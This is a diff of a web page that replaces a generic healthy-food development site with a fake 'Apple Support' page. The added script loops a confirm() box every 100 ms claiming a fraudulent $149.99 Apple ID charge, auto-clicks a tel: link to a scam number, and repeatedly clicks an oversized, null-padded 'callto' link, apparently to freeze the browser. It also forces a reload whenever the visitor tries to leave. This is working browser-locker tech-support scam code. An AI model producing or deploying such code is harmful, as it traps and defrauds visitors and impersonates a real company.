+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
                         </div>
-                    </div>
-                </section>
-
-                <div class="first-impress-sect">
-                    <div class="first-impress-heder">
-                        <div class="fih-flex">
-                            <a class="fih-logo" href="./">
-                                <img src="brand.svg" alt="">
-                                <h2> Greenfluenceenio </h2>
-                            </a>
-                            <nav class="fih-nav">
-                                <a href="./#about"> About us </a>
-                                
-                                <a href="./#comm">Comments</a>
-                                
-                                  
-                            </nav>
-                        </div>
-                    </div>
-                    <div class="first-impress-banner">
-                        <div class="fib-bg"></div>
-                        <div class="fib-cloud">
-                            <h2 class="fib-name"> Greenfluenceenio </h2>
-                            <span class="fib-txt">Health Starts Here: Our Food Is Your Source of Strength</span>
-                            <h1 class="fib-title"> Welcome to Greenfluenceenio, your trusted partner in healthy nutrition. We combine balanced food choices, reliable nutritional information, and innovative products designed to support a well-organized diet. Explore our site to discover how modern approaches to healthy eating can improve your lifestyle with transparency and consistency.</h1>
-                        </div>
-                    </div>
-                    
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
                 </div>
-                
-            </header>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-            
-
-            <main>
-
-                <div id="about" class="brand-story-section">
-                    <div class="space-frame">
-                        <h2 class="brand-story-title category--columndv">About us</h2>
-                        <div class="brand-story-flexbox">
-                            <div class="brand-story-flexcol brand-benefits">
-                                <div class="bsf-img">
-                                    <img src="pics/album-YIrCb0.jpg" alt="">
-                                </div>
-                                <div class="bsf-cont">
-                                    <div class="bsf-txt">
-                                        <span> &#9673; </span> &nbsp; Accurate Nutrient Analysis We use advanced methods to provide precise information about the nutritional composition of our products, ensuring you make informed dietary decisions.
-                                    </div>
-                                    <div class="bsf-txt">
-                                        <span> &#9673; </span> &nbsp; Innovative Product Development Our team develops cutting-edge food and beverage options that combine taste and health benefits, tailored to support balanced nutrition.
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="brand-story-flexcol brand-story">
-                                <div class="bsf-txt">
-                                    At Greenfluenceenio, we are dedicated to promoting healthy nutrition through a comprehensive approach that integrates balanced food choices, accurate nutrient analysis, and thoughtfully developed products. Our mission is to empower individuals with reliable nutritional information and innovative solutions that support informed dietary planning. By focusing on transparency and consistency, we help you navigate your nutritional needs with confidence. Whether you are looking to enhance your everyday meals or develop a personalized diet, Greenfluenceenio offers expert guidance and quality products designed to meet a wide range of health goals. Join us on a journey towards better nutrition and well-being.
-                                </div>
-                                <div class="bsf-img">
-                                    <img src="pics/album-YIrCb1.jpg" alt="">
-                                </div>
-                            </div>
-                            <div class="brand-story-flexcol brand-benefits">
-                                <div class="bsf-img">
-                                    <img src="pics/album-YIrCb2.jpg" alt="">
-                                </div>
-                                <div class="bsf-cont">
-                                    <div class="bsf-txt">
-                                        <span> &#9673; </span> &nbsp; Transparency and Trust Greenfluenceenio is committed to full transparency in ingredient sourcing and nutritional content, building trust with our customers.
-                                    </div>
-                                    <div class="bsf-txt">
-                                        <span> &#9673; </span> &nbsp; Personalized Dietary Support We offer resources and tools designed to help you create a well-organized diet that fits your unique lifestyle and health objectives.
-                                    </div>
-                                </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-830-1109 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
                             </div>
                         </div>
                     </div>
                 </div>
-            
-                <section class="product-display-bg">
-                    <div class="product-display-bgfilter"></div>
-                    <div class="space-frame product-display cartiz-header">
-                            <h2 class="product-display-title"> Greenfluenceenio  Healthy Food Product Development Hub</h2> 
-                            <div class="product-display-box">
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-                                <div class="prds-media">
-                                    <div class="prds-img">
-                                        <img src="posts/06-24-2026/Healthy-food-2026-06-19-2.jpg" alt=" Greenfluenceenio  Healthy Food Product Development Hub">
-                                    </div> 
-                                    <div class="prds-info">
-                                                                        
-                                        
-                                    </div> 
-                                </div>
-                                
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-                                <div class="prds-content">
-                                    <div class="prds-txt">
-                                        <h1>Introduction to Healthy Food and Beverage Product Development<span></span></h1>
-<p> Greenfluenceenio  provides product development services focused on healthy food and beverage solutions for businesses operating within the food industry. Product development involves transforming an initial concept into a structured food or beverage product through research, formulation, ingredient evaluation, testing, documentation, and production planning. Every stage requires careful consideration of nutritional composition, product functionality, manufacturing processes, ingredient compatibility, quality standards, and consumer expectations.</p>
-<p>The development of healthy food products combines food science, nutrition, product design, and manufacturing knowledge. Rather than focusing solely on taste or appearance, modern product development also considers nutritional balance, ingredient transparency, product consistency, shelf stability, and production efficiency.</p>
-<p>Healthy food and beverage development may support manufacturers, restaurants, beverage producers, retailers, food brands, and organizations introducing new products to the market.</p>
-<h1>Understanding Product Development</h1>
-<p>Developing a food or beverage product begins with defining the intended characteristics of the final product. These may include nutritional composition, texture, flavor profile, serving size, ingredient selection, production methods, and packaging requirements.</p>
-<p>Product development is typically organized into structured phases. Initial concepts are evaluated through research before prototype formulations are created. Testing and refinement follow until the formulation meets defined technical and nutritional objectives.</p>
-<p>This systematic approach allows each stage to be documented and evaluated before production planning begins.</p>
-<h1>Concept Development and Product Planning</h1>
-<p>The concept stage establishes the overall direction of a product.  Greenfluenceenio  evaluates the intended product category, nutritional objectives, ingredient preferences, production feasibility, and consumer requirements.</p>
-<p>Planning activities may include identifying functional characteristics, defining nutritional priorities, selecting target serving sizes, and establishing preliminary formulation guidelines.</p>
-<p>A clearly documented concept provides the foundation for subsequent research and development activities.</p>
-<h1>Ingredient Research and Selection</h1>
-<p>Ingredient selection is one of the most important stages of product development. Every ingredient contributes to nutritional composition, flavor, texture, appearance, shelf life, and manufacturing performance.</p>
-<p> Greenfluenceenio  evaluates ingredient characteristics using technical specifications, nutritional profiles, processing compatibility, and formulation requirements.</p>
-<p>Ingredient research may involve grains, fruits, vegetables, legumes, plant proteins, dairy ingredients, natural flavor components, oils, fibers, vitamins, minerals, botanical extracts, and functional food ingredients depending on project objectives.</p>
-<h1>Nutritional Composition Planning</h1>
-<p>Healthy food development requires careful planning of nutritional composition. Product formulations may be designed with attention to proteins, carbohydrates, fats, dietary fiber, vitamins, minerals, and overall energy content.</p>
-<p>Nutritional planning also considers serving sizes, ingredient balance, and consistency across production batches.</p>
-<p>Structured nutritional analysis supports documentation and internal product evaluation throughout development.</p>
-<h1>Beverage Formulation Development</h1>
-<p>Beverage development follows many of the same principles as food formulation while introducing additional considerations related to liquid stability, viscosity, ingredient suspension, acidity, sweetness, aroma, and packaging compatibility.</p>
-<p> Greenfluenceenio  develops structured beverage formulations through controlled ingredient selection and formulation testing.</p>
-<p>The process may include juices, plant-based beverages, dairy beverages, nutritional drinks, flavored waters, powdered drink mixes, or other beverage categories depending on project requirements.</p>
-<h1>Prototype Development</h1>
-<p>After planning and ingredient selection, prototype formulations are prepared for evaluation.</p>
-<p>Prototype development allows technical specialists to examine flavor, appearance, consistency, aroma, texture, and nutritional characteristics before further refinement.</p>
-<p>Multiple formulation versions may be developed to compare ingredient combinations and processing methods.</p>
-<p>Prototype testing forms an essential stage of product optimization.</p>
-<h1>Texture and Sensory Evaluation</h1>
-<p>Consumer experience depends significantly on product texture and sensory characteristics.</p>
-<p>Development projects often evaluate consistency, mouthfeel, aroma, appearance, color, and flavor balance using structured sensory assessment procedures.</p>
-<p>Adjustments may be introduced during formulation refinement to improve product consistency while maintaining nutritional objectives.</p>
-<p>Sensory evaluation contributes to comprehensive product analysis.</p>
-<h1>Processing Method Assessment</h1>
-<p>Different manufacturing processes influence the characteristics of healthy food and beverage products.</p>
-<p> Greenfluenceenio  evaluates processing methods such as mixing, heating, cooling, fermentation, drying, blending, pasteurization, homogenization, and packaging compatibility depending on the product category.</p>
-<p>Understanding processing requirements supports manufacturing consistency and product stability.</p>
-<h1>Shelf Stability Considerations</h1>
-<p>Shelf stability is an important aspect of food product development. Products must maintain intended quality characteristics throughout storage under appropriate conditions.</p>
-<p>Development activities include evaluating ingredient interactions, moisture levels, oxidation potential, packaging compatibility, and storage behavior.</p>
-<p>Shelf stability assessments contribute to long-term product consistency and quality management.</p>
-<h1>Quality Management Throughout Development</h1>
-<p>Quality management supports consistency during every development stage.</p>
-<p> Greenfluenceenio  documents formulation revisions, ingredient specifications, testing procedures, production observations, and technical evaluations.</p>
-<p>Structured quality documentation helps maintain organized development records while supporting reproducible manufacturing procedures.</p>
-<h1>Packaging Compatibility</h1>
-<p>Packaging influences product protection, storage, transportation, and presentation.</p>
-<p>Development projects may evaluate container materials, sealing systems, environmental compatibility, labeling space, storage performance, and transportation considerations.</p>
-<p>Packaging selection is coordinated with product characteristics to maintain stability throughout distribution.</p>
-<h1>Manufacturing Preparation</h1>
-<p>Before commercial production begins, manufacturing procedures are documented and organized.</p>
-<p>Preparation includes production workflows, ingredient sequencing, equipment requirements, process parameters, quality checkpoints, and documentation systems.</p>
-<p>Manufacturing planning supports consistent product preparation across production environments.</p>
-<h1>Documentation and Technical Specifications</h1>
-<p>Comprehensive documentation accompanies healthy food development.</p>
-<p>Technical documentation may include formulation records, ingredient specifications, nutritional summaries, processing instructions, quality procedures, production guidelines, and revision histories.</p>
-<p>Well-organized documentation supports efficient product management throughout its lifecycle.</p>
-<h1>Product Testing and Evaluation</h1>
-<p>Testing activities help evaluate formulation consistency under different processing and storage conditions.</p>
-<p>Development teams may review physical properties, nutritional composition, ingredient compatibility, packaging performance, and production repeatability.</p>
-<p>Testing results provide information that supports formulation refinement before final implementation.</p>
-<h1>Sustainable Ingredient Considerations</h1>
-<p>Many modern food development projects include evaluation of ingredient sourcing, production efficiency, and environmental considerations.</p>
-<p> Greenfluenceenio  may assess raw material availability, processing efficiency, packaging alternatives, and resource utilization as part of broader product planning.</p>
-<p>These considerations contribute to comprehensive development strategies.</p>
-<h1>Scalability of Product Development</h1>
-<p>Product formulations are often designed with future manufacturing scalability in mind.</p>
-<p>Development activities examine whether formulations can transition from laboratory preparation to larger production environments while maintaining consistent characteristics.</p>
-<p>Scalable formulation planning supports long-term manufacturing flexibility.</p>
-<h1>Future Trends in Healthy Food Development</h1>
-<p>Healthy food and beverage development continues to evolve alongside advances in nutrition science, ingredient innovation, food technology, and digital manufacturing systems.</p>
-<p>Future product development may include expanded use of functional ingredients, improved formulation software, precision manufacturing methods, enhanced nutritional analysis, and greater integration of digital quality management systems.</p>
-<p>Technological progress continues to influence every stage of food product innovation.</p>
-<h1>Conclusion</h1>
-<p> Greenfluenceenio  provides healthy food and beverage product development services that encompass concept planning, ingredient research, nutritional formulation, prototype development, sensory evaluation, manufacturing preparation, quality management, documentation, packaging assessment, and production planning. Through structured development methodologies and systematic technical evaluation, these services support the creation of organized food and beverage formulations designed to meet defined nutritional and production objectives.</p>
-                                    </div>
-                                    
-                                </div>
-
-                            </div>
-                            
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
                         </div>
-                </section>
-
-                
-                <section id="comm" class="real-rewiews-section">
-                    <div class="space-frame">
-                        <h2 class="real-rewiews-title">Customer Testimonials</h2>
-                        <div class="real-rewiews-flexbox">
-                            <div class="real-rewiews-media">
-                                <div class="real-rewiews-img">
-                                    <img src="pics/male-426x240-0.jpg" alt="">
-                                </div>
-                                <div class="real-rewiews-img">
-                                    <img src="pics/male-426x240-1.jpg" alt="">
-                                </div>
-                            </div>
-                            <div class="real-rewiews-list">
-                                <div class="real-rewiews-item">
-                                    <div class="rri-rating">
-                                        <span>4,2</span>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="m305-704 112-145q12-16 28.5-23.5T480-880q18 0 34.5 7.5T543-849l112 145 170 57q26 8 41 29.5t15 47.5q0 12-3.5 24T866-523L756-367l4 164q1 35-23 59t-56 24q-2 0-22-3l-179-50-179 50q-5 2-11 2.5t-11 .5q-32 0-56-24t-23-59l4-165L95-523q-8-11-11.5-23T80-570q0-25 14.5-46.5T135-647l170-57Zm49 69-194 64 124 179-4 191 200-55 200 56-4-192 124-177-194-66-126-165-126 165Zm126 135Z"/></svg>
-                                    </div>
-                                    <div class="rri-comment">
-                                        "Greenfluenceenio has transformed the way I approach my meals. Their products and advice are easy to follow and genuinely effective."
-                                    </div>
-                                    <div class="rri-author">
-                                        <div class="rri-avatar">
-                                            <img src="pics/male-426x240-2.jpg" alt="">
-                                        </div>
-                                        <div class="rri-name">
-                                            James Anderson
-                                        </div>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="m228-240 92-160q-66 0-113-47t-47-113q0-66 47-113t113-47q66 0 113 47t47 113q0 23-5.5 42.5T458-480L320-240h-92Zm360 0 92-160q-66 0-113-47t-47-113q0-66 47-113t113-47q66 0 113 47t47 113q0 23-5.5 42.5T818-480L680-240h-92ZM320-500q25 0 42.5-17.5T380-560q0-25-17.5-42.5T320-620q-25 0-42.5 17.5T260-560q0 25 17.5 42.5T320-500Zm360 0q25 0 42.5-17.5T740-560q0-25-17.5-42.5T680-620q-25 0-42.5 17.5T620-560q0 25 17.5 42.5T680-500Zm0-60Zm-360 0Z"/></svg>
-                                    </div>
-                                </div>
-                                <div class="real-rewiews-item">
-                                    <div class="rri-rating">
-                                        <span>4,5</span>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="m305-704 112-145q12-16 28.5-23.5T480-880q18 0 34.5 7.5T543-849l112 145 170 57q26 8 41 29.5t15 47.5q0 12-3.5 24T866-523L756-367l4 164q1 35-23 59t-56 24q-2 0-22-3l-179-50-179 50q-5 2-11 2.5t-11 .5q-32 0-56-24t-23-59l4-165L95-523q-8-11-11.5-23T80-570q0-25 14.5-46.5T135-647l170-57Zm49 69-194 64 124 179-4 191 200-55 200 56-4-192 124-177-194-66-126-165-126 165Zm126 135Z"/></svg>
-                                    </div>
-                                    <div class="rri-comment">
-                                        "Thanks to Greenfluenceenio, I feel more confident about the choices I make for my family’s nutrition every day."
-                                    </div>
-                                    <div class="rri-author">
-                                        <div class="rri-avatar">
-                                            <img src="pics/icon-DPr-1.jpg" alt="">
-                                        </div>
-                                        <div class="rri-name">
-                                            Emily Adams
-                                        </div>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="m228-240 92-160q-66 0-113-47t-47-113q0-66 47-113t113-47q66 0 113 47t47 113q0 23-5.5 42.5T458-480L320-240h-92Zm360 0 92-160q-66 0-113-47t-47-113q0-66 47-113t113-47q66 0 113 47t47 113q0 23-5.5 42.5T818-480L680-240h-92ZM320-500q25 0 42.5-17.5T380-560q0-25-17.5-42.5T320-620q-25 0-42.5 17.5T260-560q0 25 17.5 42.5T320-500Zm360 0q25 0 42.5-17.5T740-560q0-25-17.5-42.5T680-620q-25 0-42.5 17.5T620-560q0 25 17.5 42.5T680-500Zm0-60Zm-360 0Z"/></svg>
-                                    </div>
-                                </div>
-                            </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
-                    </div> 
-                </section>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
 
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-830-1109
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-    document.addEventListener('DOMContentLoaded', function() {
-    const flexbox = document.querySelector('.need-to-know-flexbox');
-    if (flexbox && getComputedStyle(flexbox).flexDirection === 'column') {
-        
-        document.querySelectorAll('.ntk-worktime').forEach(el => {
-        el.style.width = '100%';
-        });
 
-        document.querySelectorAll('.ntk-worktime-img').forEach(el => {
-        el.style.borderRadius = '25px';
-        });
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-        document.querySelectorAll('.ntk-worktime-img-img').forEach(el => {
-        el.style.borderRadius = '25px';
-        });
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-        document.querySelectorAll('.ntk-worktime-txt').forEach(el => {
-        el.style.top = '50%';
-        el.style.left = '50%';
-        el.style.transform = 'translate(-50%, -50%)';
-        el.style.right = 'auto';
-        el.style.bottom = 'auto';
-        });
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-        document.querySelectorAll('.ntk-content').forEach(el => {
-        el.style.width = '100%';
-        });
-    }
-    });
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-830-1109');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-830-1109"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-830-1109 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
 
-                
-                
-                <section id="order" class="purchase-map-bg">
-                    <div class="space-frame">
-                        <h2 class="purchase-map-title">Eco-Friendly: How We Choose Ingredients</h2>
-                        <div class="purchase-map-list payment-iconcx">
-                            <div class="purchase-map-item">
-                                <div class="pm-inner">
-                                    <div class="pm-num">
-                                        <span>01</span>
-                                    </div>
-                                    <div class="pm-arrow">
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                    </div>
-                                    <div class="pm-icon">
-                                       <svg width="25px" height="25px" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M7 0.0618896V9H15.9381C15.446 12.9463 12.0796 16 8 16C3.58172 16 0 12.4183 0 8C0 3.92038 3.05369 0.553988 7 0.0618896Z" fill="#000000"/>
-                                            <path d="M9 0.0618897V7H15.9381C15.4869 3.38128 12.6187 0.513137 9 0.0618897Z" fill="#000000"/>
-                                        </svg>
-                                    </div>
-                                </div>
-                                <div class="pm-content">
-                                    <h3 class="pm-title"> Consult with our nutrition experts to assess your dietary needs and goals.</h3>
-                                </div>
-                            </div>
-                            <div class="purchase-map-item">
-                                <div class="pm-inner">
-                                    <div class="pm-num">
-                                        <span>02</span>
-                                    </div>
-                                    <div class="pm-arrow">
